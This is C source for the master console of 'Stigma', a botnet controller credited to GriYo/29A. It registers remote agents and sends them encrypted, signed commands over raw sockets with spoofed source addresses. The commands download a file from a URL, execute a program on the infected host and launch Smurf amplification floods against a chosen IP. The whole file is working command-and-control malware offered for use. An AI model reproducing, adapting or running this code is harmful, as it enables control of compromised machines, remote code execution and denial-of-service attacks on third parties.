#include "Master.h"

char			szConfigFile[ MAX_PATH] ;
char			szCurrentAgent[ SIZEOF_AGENT_NAME] ;

BLOWFISH_CTX	ctx ;
dword			MDbuf[ RMDsize / 32] ;

int main( int argc, char **argv)
{
	WSADATA			wsa ;
	int				ch ;

	GetCurrentDirectory( MAX_PATH, szConfigFile) ;
	strcat( szConfigFile, "\\stigma.ini") ;

	memset( szCurrentAgent, 0, SIZEOF_AGENT_NAME) ;

	Clear() ;

	printf( "Stigma - BioCoded by GriYo/29A\n\n"
			"Initializing RMD160 engine... ") ;

	MDinit( MDbuf) ;

	printf( "Ok\n"
			"Initializing BLOWFISH engine... ") ;

	Blowfish_Init( &ctx, STIGMA_PASSWORD, sizeof( STIGMA_PASSWORD) - 1) ;

	printf( "Ok\n"
			"Initializing Windows sockets library... ") ;

    if( WSAStartup( 0x00000202, &wsa) != 0)
    {
        printf( "Error: WSAStartup()\n", FOREGROUND_RED) ;
        return 0 ;
    }

	printf( "Ok\n\n"
			"Press any key...\n") ;

	ch = getch() ;

	while( ch != '0')
	{
		Clear() ;

		printf(	"STIGMA (master app)\n"
				"\n"
				"    1. List agents\n"
				"    2. Add agent\n"
				"    3. Delete agent\n"
				"    4. Talk to: ") ;

		if( szCurrentAgent[ 0] == ( char) NULL) printf( "ALL") ;
		else printf( szCurrentAgent) ;

		printf(	"\n"
				"    5. Download\n"
				"    6. Execute\n"
				"    7. Smurf\n"
				"    8. Update broadcast list\n"
				"\n"
				"    0. Exit\n\n") ;

		do
		{
			ch = getch() ;
		}
		while( ( ch < '0') || ( ch > '8')) ;

		switch( ch)
		{
		case '1':

			ListAgents() ;
			break ;

		case '2':

			AddAgent() ;
			break ;

		case '3':

			DeleteAgent() ;
			break ;

		case '4':

			Talk2() ;
			break ;

		case '5':

			Command_GetFile() ;
			break ;

		case '6':

			Command_Execute() ;
			break ;

		case '7':

			Command_Smurf() ;
			break ;

		case '8':

			Command_UpdateBcast() ;
			break ;
		}

		if( ch != '0')
		{
			printf( "Press any key...\n") ;
			getch() ;
		}
	}

	WSACleanup() ;

	Clear() ;

	printf( "Bye\n") ;

	return 0 ;
}

void Clear( void)
{
	int Count ;

	for( Count = 0 ; Count < 160 ; Count++) printf( "\n") ;
}

char *Ip2Str( unsigned long Ip)
{
	static char szIp[ 16] ;

	sprintf( szIp, "%d.%d.%d.%d", Ip & 0x000000FF,
								  ( Ip >> 8) & 0x000000FF,
								  ( Ip >> 16) & 0x000000FF,
								  ( Ip >> 24) & 0x000000FF) ;

	return szIp ;
}

void ListAgents( void)
{
	char		szBuffer[ ( SIZEOF_AGENT_NAME * NUMBEROF_AGENTS) + 1] ;
	char		*Pos ;
	int			Count ;
	AGENT_DATA	Agent ;

	Clear() ;

	memset( szBuffer, 0, ( SIZEOF_AGENT_NAME * NUMBEROF_AGENTS) + 1) ;

	GetPrivateProfileString(	NULL,
								NULL,
								"*",
								szBuffer,
								( SIZEOF_AGENT_NAME * NUMBEROF_AGENTS) + 1,
								szConfigFile) ;

	if( szBuffer[ 0] == '*') 
	{
		printf( "Error: No agents found\n") ;
		return ;
	}

	Pos = szBuffer ;
	Count = 0 ;

	while( *Pos != ( char) NULL)
	{
		strncpy( Agent.Name, Pos, SIZEOF_AGENT_NAME) ;

		if( ReadAgent( &Agent))
		{
			printf( "%d - %s\n", ( Count + 1), Agent.Name) ;
			printf( "        Agent ip: %s\n", Ip2Str( Agent.AgentIp)) ;
			printf( "      Agent port: %d\n", Agent.AgentPort) ;
			printf( "        Protocol: ") ;

			switch( Agent.Protocol)
			{
			case IPPROTO_ICMP:
				printf( "ICMP\n") ;
				break ;

			case IPPROTO_TCP:
				printf( "TCP\n") ;
				break ;

			case IPPROTO_UDP:
				printf( "UDP\n") ;
				break ;
			}

			if( ( Agent.Protocol == IPPROTO_TCP) || ( Agent.Protocol == IPPROTO_UDP))
			{
				printf( "       Source ip: %s\n", Ip2Str( Agent.MasterIp)) ;
				printf( "     Source port: %d\n", Agent.MasterPort) ;
			}

			printf( "\n") ;

			Count++ ;
		}
		else
		{
			printf( "* %d - %s\n"
					"       There was a problem reading this agent data\n\n", ( Count + 1), Pos) ;
		}

		while( *Pos != ( char) NULL) Pos++ ;

		Pos++ ;
	}

	if( Count == 0)
	{
		printf( "Error: There are no agents defined\n") ;
	}
	else
	{
		printf( "Total: %d agents\n", Count) ;
	}
}

void AddAgent( void)
{
	AGENT_DATA	Agent ;
	char		*Pos ;
	char		szAux[ 1024] ;

	Clear() ;

	printf( "ADD AGENT\n\n") ;

	printf( "Enter agent name (a-z lowercase, 15 characters max): ") ;
	gets( szAux) ;

	if( strlen( szAux) > 15)
	{
		printf( "Error: Agent name too long\n") ;
		return ;
	}

	Pos = szAux ;

	while( *Pos != ( char) NULL)
	{
		if( ( *Pos < 'a') || ( *Pos > 'z'))
		{
			printf( "Error: Invalid agent name\n") ;
			return ;
		}

		Pos++ ;
	}

	strncpy( Agent.Name, szAux, 15) ;

	printf( "Enter the ip address of the machine where agent is installed: ") ;
	gets( szAux) ;

	Agent.AgentIp = inet_addr( szAux) ;

	if( Agent.AgentIp == INADDR_NONE)
	{
		printf( "Error: Invalid ip address\n") ;
		return ;
	}

	printf( "Enter the source ip address to use when talking with this agent: ") ;
	gets( szAux) ;

	Agent.MasterIp = inet_addr( szAux) ;

	if( Agent.MasterIp == INADDR_NONE)
	{
		printf( "Error: Invalid ip address\n") ;
		return ;
	}

	printf( "Enter the protocol to use (icmp, udp or tcp): ") ;
	gets( szAux) ;

	Agent.Protocol = 0 ;

	if( strnicmp( szAux, "icmp", 4) == 0)		Agent.Protocol = IPPROTO_ICMP ;
	else if( strnicmp( szAux, "udp", 3) == 0)	Agent.Protocol = IPPROTO_UDP ;
	else if( strnicmp( szAux, "tcp", 3) == 0)	Agent.Protocol = IPPROTO_TCP ;

	if( Agent.Protocol == 0)
	{
		printf( "Error: Invalid protocol\n") ;
		return ;
	}

	if( ( Agent.Protocol == IPPROTO_TCP) || ( Agent.Protocol == IPPROTO_UDP))
	{
		printf( "Enter the destination port: ") ;
		gets( szAux) ;

		Agent.AgentPort = ( unsigned short) atoi( szAux) ;

		if( Agent.AgentPort == 0)
		{
			printf( "Error: Invalid port\n") ;
			return ;
		}

		printf( "Enter the source port: ") ;
		gets( szAux) ;

		Agent.MasterPort = ( unsigned short) atoi( szAux) ;

		if( Agent.MasterPort == 0)
		{
			printf( "Error: Invalid port\n") ;
			return ;
		}
	}

	if( WriteAgent( &Agent))
	{
		printf( "Success: Agent information saved\n") ;
	}
	else
	{
		printf( "There was an error saving agent information\n") ;
	}
}

void DeleteAgent( void)
{
	char		szAux[ 1024] ;
	AGENT_DATA	Agent ;

	Clear() ;

	printf( "DELETE AGENT\n\n") ;

	printf( "Enter agent name: ") ;
	gets( szAux) ;

	strncpy( Agent.Name, szAux, SIZEOF_AGENT_NAME) ;

	if( ReadAgent( &Agent))
	{
		if( WritePrivateProfileString(	Agent.Name,
										NULL,
										NULL,
										szConfigFile))
		{
			printf( "Success: Agent has been deleted\n") ;
		}
		else
		{
			printf( "Error: There was an error while trying to delete agent data\n") ;
		}
	}
	else
	{
		printf( "Error: Agent not found\n") ;
	}
}

void Talk2( void)
{
	char		szAux[ 1024] ;
	AGENT_DATA	Agent ;

	Clear() ;

	printf( "TALK 2 AGENT\n\n") ;

	printf( "Enter agent name (or just press enter to select all agents): ") ;
	gets( szAux) ;

	if( szAux[ 0] == ( char) NULL)
	{
		printf( "Success: All agents selected\n") ;

		szCurrentAgent[ 0] = ( char) NULL ;
	}
	else
	{
		strncpy( Agent.Name, szAux, SIZEOF_AGENT_NAME) ;

		if( ReadAgent( &Agent))
		{
			printf( "Success: Agent has been selected\n") ;

			strncpy( szCurrentAgent, Agent.Name, SIZEOF_AGENT_NAME) ;
		}
		else
		{
			printf( "Error: Agent not found\n") ;
		}
	}
}

void Command_GetFile( void)
{
	unsigned long	Size ;
	char			szAux[ 1024] ;

	STIGMA_COMMAND_GETFILE	GetFileData ;

	memset( &GetFileData, 0, sizeof( STIGMA_COMMAND_GETFILE)) ;

	Clear() ;

	printf( "DOWNLOAD\n\n") ;

	printf( "Url: ") ;
	gets( szAux) ;

	strncpy( GetFileData.Url, szAux, SIZEOF_GETFILE_REMOTE) ;

	printf( "Local: ") ;
	gets( szAux) ;

	strncpy( GetFileData.Local, szAux, SIZEOF_GETFILE_LOCAL) ;

	printf( "Size: ") ;
	gets( szAux) ;

	Size = atoi( szAux) ;

	if( Size == 0)
	{
		printf( "Error: Invalid file size\n") ;
		return ;
	}

	GetFileData.Size = Size ;

	SendCommand(	COMMAND_ID_GETFILE,
					( unsigned char *) &GetFileData,
					sizeof( STIGMA_COMMAND_GETFILE)) ;
}

void Command_Execute( void)
{
	char	szAux[ 1024] ;

	STIGMA_COMMAND_EXECUTE	ExecuteData ;

	memset( &ExecuteData, 0, sizeof( STIGMA_COMMAND_EXECUTE)) ;

	Clear() ;

	printf( "EXECUTE\n\n") ;

	printf( "App: ") ;
	gets( szAux) ;

	strncpy( ExecuteData.App, szAux, SIZEOF_EXECUTE_APPNAME) ;

	printf( "Parameters: ") ;
	gets( szAux) ;

	strncpy( ExecuteData.Param, szAux, SIZEOF_EXECUTE_PARAMS) ;

	SendCommand(	COMMAND_ID_EXECUTE,
					( unsigned char *) &ExecuteData,
					sizeof( STIGMA_COMMAND_EXECUTE)) ;
}

void Command_Smurf( void)
{
	char	szAux[ 1024] ;

	STIGMA_COMMAND_SMURF	SmurfData ;

	memset( &SmurfData, 0, sizeof( STIGMA_COMMAND_SMURF)) ;

	Clear() ;

	printf( "SMURF\n\n") ;

	printf( "Target ip: ") ;
	gets( szAux) ;

	SmurfData.Ip = inet_addr( szAux) ;

	if( SmurfData.Ip == INADDR_NONE)
	{
		printf( "Error: Invalid Ip address\n") ;
		return ;
	}

	printf( "Number of packets to send: ") ;
	gets( szAux) ;

	SmurfData.Count = atoi( szAux) ;

	if( SmurfData.Count == 0)
	{
		printf( "Error: Invalid packet count\n") ;
		return ;
	}

	SendCommand(	COMMAND_ID_SMURF,
					( unsigned char *) &SmurfData,
					sizeof( STIGMA_COMMAND_SMURF)) ;
}

void Command_UpdateBcast( void)
{
	char	szAux[ 1024] ;

	STIGMA_COMMAND_UPDATEBCAST	UpdateBcastData ;

	memset( &UpdateBcastData, 0, sizeof( STIGMA_COMMAND_UPDATEBCAST)) ;

	Clear() ;

	printf( "UPDATE BROADCAST LIST\n\n") ;

	printf( "File: ") ;
	gets( szAux) ;

	strncpy( UpdateBcastData.File, szAux, SIZEOF_UPDATEBCAST_FILE) ;
	
	SendCommand(	COMMAND_ID_UPDATEBCAST,
					( unsigned char *) &UpdateBcastData,
					sizeof( STIGMA_COMMAND_UPDATEBCAST)) ;
}

void SendCommand( unsigned char CommandId, unsigned char *Data, unsigned short Size)
{
	char			ch ;

	unsigned char	Buffer[ 1024] ;
	unsigned char	*Pos ;
	unsigned char	*Ptr2RMD160 ;

	STIGMA_COMMAND	CommandData ;

	memset( Buffer, 0, 1024) ;
	memset( &CommandData, 0, sizeof( STIGMA_COMMAND)) ;

	CommandData.Signature = STIGMA_SIGNATURE ;
	CommandData.Id = CommandId ;

	Ptr2RMD160 = RMD( Data, Size) ;
	memcpy( CommandData.RMD160, Ptr2RMD160, 20) ;

	Pos = Buffer ;

	memcpy( Pos, &CommandData, sizeof( STIGMA_COMMAND)) ;
	Pos += sizeof( STIGMA_COMMAND) ;

	memcpy( Pos, Data, Size) ;

	Size += ( unsigned short)( sizeof( STIGMA_COMMAND)) ;

	Blowfish_Encode( &ctx, Buffer + 4, Size - 4) ;

	if( szCurrentAgent[ 0] == ( char) NULL)
	{
		// Send command to all agents
	}
	else
	{
		do
		{
			SendBuffer2Agent(	szCurrentAgent,
								Buffer,
								Size) ;

			printf( "Repeat this command (y/n) ? ") ;
			
			do
			{
				ch = getch() ;

			} while( ( ch != 'y') && ( ch != 'n')) ;

			printf( "\n") ;

		} while( ch == 'y') ;
	}
}

void SendBuffer2Agent( char *Name, unsigned char *Buffer, unsigned short Size)
{
	AGENT_DATA Agent ;

	strncpy( Agent.Name, Name, SIZEOF_AGENT_NAME) ;

	if( ReadAgent( &Agent))
	{
		switch( Agent.Protocol)
		{
		case IPPROTO_ICMP:

			if( SendICMP(	Buffer,
							Size,
							Agent.MasterIp,
							Agent.AgentIp))
			{
				printf( "Success: Command sent (%d bytes)\n", Size) ;
			}
			else
			{
				printf( "Error: Failed to send command\n") ;
			}

			break ;

		case IPPROTO_TCP:

			if( SendTCP(	Buffer,
							Size,
							Agent.MasterIp,
							Agent.MasterPort,
							Agent.AgentIp,
							Agent.AgentPort))
			{
				printf( "Success: Command sent (%d bytes)\n", Size) ;
			}
			else
			{
				printf( "Error: Failed to send command\n") ;
			}

			break ;

		case IPPROTO_UDP:

			if( SendUDP(	Buffer,
							Size,
							Agent.MasterIp,
							Agent.MasterPort,
							Agent.AgentIp,
							Agent.AgentPort))
			{
				printf( "Success: Command sent (%d bytes)\n", Size) ;
			}
			else
			{
				printf( "Error: Failed to send command\n") ;
			}

			break ;
		}
	}
	else
	{
		printf( "Error: Could not load agent information\n") ;
	}
}

BOOL ReadAgent( AGENT_DATA *pAgent)
{
	pAgent->AgentIp = GetPrivateProfileInt(		pAgent->Name,
												"AgentIp",
												0,
												szConfigFile) ;

	if( pAgent->AgentIp == 0) return FALSE ;

	pAgent->MasterIp = GetPrivateProfileInt(	pAgent->Name,
												"MasterIp",
												0,
												szConfigFile) ;

	if( pAgent->MasterIp == 0) return FALSE ;

	pAgent->AgentPort = GetPrivateProfileInt(	pAgent->Name,
												"AgentPort",
												0,
												szConfigFile) ;

	if( pAgent->AgentPort == 0) return FALSE ;

	pAgent->MasterPort = GetPrivateProfileInt(	pAgent->Name,
												"MasterPort",
												0,
												szConfigFile) ;

	if( pAgent->MasterPort == 0) return FALSE ;

	pAgent->Protocol = GetPrivateProfileInt(	pAgent->Name,
												"Protocol",
												0,
												szConfigFile) ;

	if( pAgent->Protocol == 0) return FALSE ;

	return TRUE ;
}

BOOL WriteAgent( AGENT_DATA *pAgent)
{
	char szAux[ 1024] ;
	
	sprintf( szAux, "%d", pAgent->AgentIp) ;

	if( WritePrivateProfileString(	pAgent->Name,
									"AgentIp",
									szAux,
									szConfigFile) == 0) return FALSE ;

	sprintf( szAux, "%d", pAgent->MasterIp) ;

	if( WritePrivateProfileString(	pAgent->Name,
									"MasterIp",
									szAux,
									szConfigFile) == 0) return FALSE ;

	sprintf( szAux, "%d", pAgent->AgentPort) ;

	if( WritePrivateProfileString(	pAgent->Name,
									"AgentPort",
									szAux,
									szConfigFile) == 0) return FALSE ;

	sprintf( szAux, "%d", pAgent->MasterPort) ;

	if( WritePrivateProfileString(	pAgent->Name,
									"MasterPort",
									szAux,
									szConfigFile) == 0) return FALSE ;

	sprintf( szAux, "%d", pAgent->Protocol) ;

	if( WritePrivateProfileString(	pAgent->Name,
									"Protocol",
									szAux,
									szConfigFile) == 0) return FALSE ;

	return TRUE ;
}

BOOL SendICMP(	unsigned char *Msg, 
				unsigned short MsgSize, 
				unsigned long SrcAddr,
				unsigned long DstAddr)
{
	SOCKET				s ;

	BOOL				Option ;
	BOOL				RetVal ;

	IP					ip ;
	ICMP				icmp ;
	unsigned short		TotalSize ;
	struct sockaddr_in	Target ;

	BYTE				*Pos ;
	BYTE				Buffer[ 4096] ;
	
    s = WSASocket( AF_INET, SOCK_RAW, IPPROTO_ICMP, NULL, 0,0) ;

    if( s == INVALID_SOCKET)
    {
		printf( "Error: WSASocket()") ;
        return FALSE ;
    }

	Option = TRUE ;

    if( setsockopt( s, 
					IPPROTO_IP, 
					IP_HDRINCL, 
					( char *) &Option, 
					sizeof( Option)) == SOCKET_ERROR)
	{
		printf( "Error: setsockopt()") ;
		return FALSE ;
	}

	TotalSize = sizeof( IP) + sizeof( ICMP) + MsgSize ;

	ip.ip_verlen		=	( BYTE)( ( 4 << 4) | 
							sizeof( IP) / sizeof( unsigned long)) ;
	ip.ip_tos			=	0 ;
	ip.ip_totallength	=	htons( TotalSize) ;
	ip.ip_id			=	htons( rand()) ;
	ip.ip_offset		=	0 ;
	ip.ip_ttl			=	128 ;
	ip.ip_protocol		=	IPPROTO_ICMP ;
	ip.ip_checksum		=	0 ;
	ip.ip_srcaddr		=	SrcAddr ;
	ip.ip_destaddr		=	DstAddr ;

	icmp.Type = ECHO ;
	icmp.Code = 0 ;
	icmp.Misc = 0 ;
	icmp.Checksum = checksum( ( unsigned short *) &icmp, sizeof( ICMP) + MsgSize) ;

	memset( Buffer, 0, 512) ;

	Pos = Buffer ;

	memcpy( Pos, &ip, sizeof( ip)) ;
	Pos += sizeof( ip) ;

	memcpy( Pos, &icmp, sizeof( icmp)) ;
	Pos += sizeof( icmp) ;
	
	memcpy( Pos, Msg, MsgSize) ;
	
	memset( &Target, 0, sizeof( struct sockaddr_in)) ;

	Target.sin_family		= AF_INET ;
	Target.sin_port			= 0 ;
	Target.sin_addr.s_addr	= ip.ip_destaddr ;

	if( sendto(	s, 
				Buffer, 
				TotalSize, 
				0, 
				( SOCKADDR *) &Target, 
				sizeof( Target)) == SOCKET_ERROR)
	{
		RetVal = FALSE ;
	}
	else
	{
		RetVal = TRUE ;
	}

	closesocket( s) ;

	return RetVal ;
}

BOOL SendUDP(	unsigned char *Msg, 
				unsigned short MsgSize, 
				unsigned long SrcAddr, 
				unsigned short SrcPort, 
				unsigned long DstAddr,
				unsigned short DstPort)
{
	SOCKET				s ;

	BOOL				Option ;
	BOOL				RetVal ;

	IP					ip ;
	UDP					udp ;
	unsigned short		TotalSize ;
	struct sockaddr_in	Target ;

	BYTE				*Pos ;
	BYTE				Buffer[ 4096] ;
	
    s = WSASocket( AF_INET, SOCK_RAW, IPPROTO_UDP, NULL, 0,0) ;

    if( s == INVALID_SOCKET)
    {
		printf( "Error: WSASocket()") ;
        return FALSE ;
    }

	Option = TRUE ;

    if( setsockopt( s, 
					IPPROTO_IP, 
					IP_HDRINCL, 
					( char *) &Option, 
					sizeof( Option)) == SOCKET_ERROR)
	{
		printf( "Error: setsockopt()") ;
		return FALSE ;
	}

	TotalSize = sizeof( IP) + sizeof( UDP) + MsgSize ;

	ip.ip_verlen		=	( BYTE)( ( 4 << 4) | 
							sizeof( IP) / sizeof( unsigned long)) ;
	ip.ip_tos			=	0 ;
	ip.ip_totallength	=	htons( TotalSize) ;
	ip.ip_id			=	htons( rand()) ;
	ip.ip_offset		=	0 ;
	ip.ip_ttl			=	128 ;
	ip.ip_protocol		=	IPPROTO_UDP ;
	ip.ip_checksum		=	0 ;
	ip.ip_srcaddr		=	SrcAddr ;
	ip.ip_destaddr		=	DstAddr ;

	udp.SrcPort = htons( SrcPort) ;
	udp.DstPort = htons( DstPort) ;
	udp.DataOff = htons( ( unsigned short)( sizeof( udp) + MsgSize)) ;
	udp.Checksum = 0 ;

	memset( Buffer, 0, 512) ;

	Pos = Buffer ;

	memcpy( Pos, &ip.ip_srcaddr, 4) ;
	Pos += 4 ;

	memcpy( Pos, &ip.ip_destaddr, 4) ;
	Pos+= 4 ;

	Pos++ ;

	memcpy( Pos, &ip.ip_protocol, 1) ;
	Pos++ ;

	memcpy( Pos, &udp.DataOff, 2) ;
	Pos += 2 ;
		
	memcpy( Pos, &udp, sizeof( udp)) ;
	Pos += sizeof( udp) ;

	memcpy( Pos, Msg, MsgSize) ;
	Pos += MsgSize ;

	udp.Checksum = checksum( ( USHORT *) Buffer, 12 + sizeof( udp) + MsgSize) ;

	memset( Buffer, 0, 512) ;

	Pos = Buffer ;

	memcpy( Pos, &ip, sizeof( ip)) ;
	Pos += sizeof( ip) ;

	memcpy( Pos, &udp, sizeof( udp)) ;
	Pos += sizeof( udp) ;
	
	memcpy( Pos, Msg, MsgSize) ;
	
	memset( &Target, 0, sizeof( struct sockaddr_in)) ;

	Target.sin_family		= AF_INET ;
	Target.sin_port			= udp.DstPort ;
	Target.sin_addr.s_addr	= ip.ip_destaddr ;

	if( sendto(	s, 
				Buffer, 
				TotalSize, 
				0, 
				( SOCKADDR *) &Target, 
				sizeof( Target)) == SOCKET_ERROR)
	{
		RetVal = FALSE ;
	}
	else
	{
		RetVal = TRUE ;
	}

	closesocket( s) ;

	return RetVal ;
}

BOOL SendTCP(	unsigned char *Msg, 
				unsigned short MsgSize, 
				unsigned long SrcAddr, 
				unsigned short SrcPort, 
				unsigned long DstAddr,
				unsigned short DstPort)
{
	SOCKET				s ;

	BOOL				Option ;
	BOOL				RetVal ;

	IP					ip ;
	TCP					tcp ;
	unsigned short		TotalSize ;
	struct sockaddr_in	Target ;

	BYTE				*Pos ;
	BYTE				*IpHere ;
	BYTE				Buffer[ 4096] ;
	
    s = WSASocket( AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0,0) ;

    if( s == INVALID_SOCKET)
    {
		printf( "Error: WSASocket()") ;
        return FALSE ;
    }

	Option = TRUE ;

    if( setsockopt( s, 
					IPPROTO_IP,
					IP_HDRINCL, 
					( char *) &Option, 
					sizeof( Option)) == SOCKET_ERROR)
	{
		printf( "Error: setsockopt()") ;
		return FALSE ;
	}

	TotalSize = sizeof( IP) + sizeof( TCP) + MsgSize ;

	ip.ip_verlen		=	( BYTE)( ( 4 << 4) | 
							sizeof( IP) / sizeof( unsigned long)) ;
	ip.ip_tos			=	0 ;
	ip.ip_totallength	=	htons( TotalSize) ;
	ip.ip_id			=	htons( rand()) ;
	ip.ip_offset		=	0 ;
	ip.ip_ttl			=	128 ;
	ip.ip_protocol		=	IPPROTO_TCP ;
	ip.ip_checksum		=	0 ;
	ip.ip_srcaddr		=	SrcAddr ;
	ip.ip_destaddr		=	DstAddr ;

	tcp.SrcPort			= htons( SrcPort) ;
	tcp.DstPort			= htons( DstPort) ;
	tcp.AckNum			= htonl( rand()) ;
	tcp.DataOff			= htons( ( unsigned short)( sizeof( tcp) + MsgSize)) ;
	tcp.Flags			= TCP_FLAG_PUSH ;
	tcp.SeqNum			= htonl( rand()) ;
	tcp.UrgPtr			= 0 ;
	tcp.Window			= htons( 65535) ;
	tcp.Chksum			= 0 ;

	memset( Buffer, 0, 512) ;

	Pos = Buffer ;

	memcpy( Pos, &ip.ip_srcaddr, 4) ;
	Pos += 4 ;

	memcpy( Pos, &ip.ip_destaddr, 4) ;
	Pos+= 4 ;

	Pos++ ;

	memcpy( Pos, &ip.ip_protocol, 1) ;
	Pos++ ;
	
	memcpy( Pos, &tcp.DataOff, 2) ;
	Pos += 2 ;
		
	memcpy( Pos, &tcp, sizeof( tcp)) ;
	Pos += sizeof( tcp) ;

	memcpy( Pos, Msg, MsgSize) ;
	Pos += MsgSize ;

	tcp.Chksum = checksum( ( USHORT *) Buffer, 12 + sizeof( tcp) + MsgSize) ;

	memset( Buffer, 0, 512) ;

	Pos = Buffer ;
	IpHere = Buffer ;

	memcpy( Pos, &ip, sizeof( ip)) ;
	Pos += sizeof( ip) ;

	memcpy( Pos, &tcp, sizeof( tcp)) ;
	Pos += sizeof( tcp) ;
	
	memcpy( Pos, Msg, MsgSize) ;

	ip.ip_checksum = checksum( ( USHORT *) Buffer, 12 + sizeof( ip) + sizeof( tcp) + MsgSize) ;

	memcpy( IpHere, &ip, sizeof( ip)) ;
	
	memset( &Target, 0, sizeof( struct sockaddr_in)) ;

	Target.sin_family		= AF_INET ;
	Target.sin_port			= tcp.DstPort ;
	Target.sin_addr.s_addr	= ip.ip_destaddr ;

	if( sendto(	s, 
				Buffer, 
				TotalSize, 
				0, 
				( SOCKADDR *) &Target, 
				sizeof( Target)) == SOCKET_ERROR)
	{
		RetVal = FALSE ;
	}
	else
	{
		RetVal = TRUE ;
	}

	closesocket( s) ;

	return RetVal ;
}

USHORT checksum( unsigned short *buffer, int size)
{
	unsigned long cksum ;
	
	cksum = 0 ;

	while( size > 1)
	{
		cksum += *buffer++ ;
		size  -= sizeof( USHORT) ;
	}
	
	if( size)
	{
		cksum += *( UCHAR *) buffer ;
	}

	cksum = ( cksum >> 16) + ( cksum & 0xffff) ;
	cksum += ( cksum >> 16) ; 

	return ( USHORT)( ~cksum) ;
}
